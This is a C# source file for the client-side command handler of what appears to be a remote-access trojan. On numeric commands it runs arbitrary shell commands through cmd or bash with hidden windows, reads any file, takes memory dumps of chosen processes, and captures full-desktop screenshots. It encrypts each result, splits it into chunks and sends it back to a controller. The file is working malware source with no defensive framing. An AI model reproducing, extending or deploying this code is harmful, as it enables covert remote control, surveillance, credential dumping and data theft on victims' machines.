using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Diagnostics.CodeAnalysis;
using Microsoft.Win32.SafeHandles;
using System.Drawing;
using System.Drawing.Imaging;
using System.ServiceModel.Channels;

namespace Client_side
{
    internal class HandleCommand
    {
        public static readonly int MaxChunkSize = 4096;
        public static object NativeMethods { get; private set; }

        public static void ProcessCommand(string command, Encryptor encryptor)
        {
            string delimiter = "|;|";
            string[] commandParts = command.Split(delimiter);
            string id = commandParts[0];
            switch (id)
            {
                case "1":
                    {
                        string result = ExecuteCommand(commandParts[1]);
                        byte[] encryptedResult = encryptor.Encrypt(result);
                        NetworkLayer.SendResult(encryptedResult);
                        break;
                    }
                case "2":
                    {
                        List<string> fileChunks = GetFile(commandParts[1]);
                        string fileID = Guid.NewGuid().ToString();
                        string fileLength = fileChunks.Count.ToString();
                        string fileName = $"{commandParts[1]}";

                        // Send the file ID, file name and the number of chunks
                        string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                        byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                        NetworkLayer.SendResult(encryptedHeader);
                        // Send the file chunks
                        int counter = 0;
                        foreach (string chunk in fileChunks)
                        {
                            string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{counter}";
                            byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
                            NetworkLayer.SendResult(encryptedChunk);
                            Thread.Sleep(10);
                            counter++;
                        }
                        break;
                    }
                case "3":
                    {
                        break;
                    }
                case "4":
                    {
                        List<string> dumpChunks = GetProcDump(commandParts[1]);
                        string fileID = Guid.NewGuid().ToString();
                        string fileLength = dumpChunks.Count.ToString();
                        string fileName = $"dump{commandParts[1]}.dmp";

                        // Send the file ID, file name and the number of chunks
                        string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                        byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                        NetworkLayer.SendResult(encryptedHeader);
                        // Send the file chunks
                        int counter = 0;
                        foreach (string chunk in dumpChunks)
                        {
                            string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{counter}";
                            byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
                            NetworkLayer.SendResult(encryptedChunk);
                            Thread.Sleep(10);
                            counter++;
                        }
                        break;
                    }
                case "5":
                    {
                        List<string> screenShotChunks = GetScreenShot();
                        string fileID = Guid.NewGuid().ToString();
                        string fileLength = screenShotChunks.Count.ToString();
                        string fileName = "screenshot.png";

                        // Send the file ID, file name and the number of chunks
                        string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                        byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                        NetworkLayer.SendResult(encryptedHeader);

                        // Send the file chunks
                        int counter = 0;
                        foreach (string chunk in screenShotChunks)
                        {
                            string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{counter}";
                            byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
                            NetworkLayer.SendResult(encryptedChunk);
                            Thread.Sleep(10); // Sleep for 10ms to avoid packet loss
                            counter++;
                        }
                        break;
                    }
                case "6":
                    {
                        string result = ExecuteCommand(commandParts[1]);
                        byte[] encryptedResult = encryptor.Encrypt(result);
                        NetworkLayer.SendResult(encryptedResult);
                        break;
                    }
                case "7":
                    {
                        string result = ExecuteCommand(commandParts[1]);
                        byte[] encryptedResult = encryptor.Encrypt(result);
                        NetworkLayer.SendResult(encryptedResult);
                        break;
                    }
                case "8":
                    {
                        NetworkLayer.SendResult(encryptor.Encrypt("Client - Logout"));
                        Environment.Exit(0);
                        break;
                    }
                default:
                    {
                        break;
                    }
            }
        }
        public static string ExecuteCommand(string command)
        {
            string result;
            string os = Environment.OSVersion.ToString();
            if (os.Contains("Windows"))
            {
                try
                {
                    ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command);
                    procStartInfo.RedirectStandardOutput = true;
                    procStartInfo.UseShellExecute = false;
                    procStartInfo.CreateNoWindow = true;
                    Process proc = new()
                    {
                        StartInfo = procStartInfo
                    };
                    proc.Start();
                    result = proc.StandardOutput.ReadToEnd();
                }
                catch (Exception e)
                {
                    result = e.Message;
                }
            }
            else
            {
                try
                {
                    ProcessStartInfo procStartInfo = new ProcessStartInfo("/bin/bash", "-c " + command);
                    procStartInfo.RedirectStandardOutput = true;
                    procStartInfo.UseShellExecute = false;
                    procStartInfo.CreateNoWindow = true;
                    Process proc = new()
                    {
                        StartInfo = procStartInfo
                    };
                    proc.Start();
                    result = proc.StandardOutput.ReadToEnd();
                }
                catch (Exception e)
                {
                    result = e.Message;
                }
            }
            
            return result;
        }

        public static List<string> GetFile(string path)
        {
            byte[] fileContent;
            try
            {
                fileContent = File.ReadAllBytes(path);
                string fileContent64 = Encryptor.ConvertStr(fileContent);
                List<string> chunks = new();
                for (int i = 0; i < fileContent64.Length; i += MaxChunkSize)
                {
                    chunks.Add(fileContent64.Substring(i, Math.Min(MaxChunkSize, fileContent64.Length - i)));
                }

                return chunks;
            }
            catch (Exception e)
            {
                return new List<string> { e.Message };
            }
        }


        public static List<string> GetProcDump(string pid)
        {
            return MiniDumpHandler.Minidump(int.Parse(pid));
        }


        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        private const int SM_XVIRTUALSCREEN = 76;
        private const int SM_YVIRTUALSCREEN = 77;
        private const int SM_CXVIRTUALSCREEN = 78;
        private const int SM_CYVIRTUALSCREEN = 79;

        [StructLayout(LayoutKind.Sequential)]
        private struct Rect
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        public static Image CaptureDesktop()
        {
            SetProcessDPIAware();
            int left = GetSystemMetrics(SM_XVIRTUALSCREEN);
            int top = GetSystemMetrics(SM_YVIRTUALSCREEN);
            int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
            int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

            // Calculate the total bounds of all screens
            Rectangle bounds = new Rectangle(left, top, width, height);
            Bitmap result = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);

            using (Graphics graphics = Graphics.FromImage(result))
            {
                graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
            }

            return result;
        }

        public static Bitmap CaptureActiveWindow()
        {
            return CaptureWindow(GetForegroundWindow());
        }

        public static Bitmap CaptureWindow(IntPtr handle)
        {
            var rect = new Rect();
            GetWindowRect(handle, ref rect);
            var bounds = new Rectangle(rect.Left, rect.Top, rect.Right - rect.Left, rect.Bottom - rect.Top);
            var result = new Bitmap(bounds.Width, bounds.Height);

            using (var graphics = Graphics.FromImage(result))
            {
                graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
            }

            return result;
        }

        private static List<String> GetScreenShot()
        {
            List<string> chunks = new();
            Image screenShot = CaptureDesktop();
            using (MemoryStream ms = new())
            {
                screenShot.Save(ms, ImageFormat.Png);
                byte[] imageBytes = ms.ToArray();
                string imageBase64 = Encryptor.ConvertStr(imageBytes);
                for (int i = 0; i < imageBase64.Length; i += MaxChunkSize)
                {
                    chunks.Add(imageBase64.Substring(i, Math.Min(MaxChunkSize, imageBase64.Length - i)));
                }
            }
            return chunks;
        }
    }
}
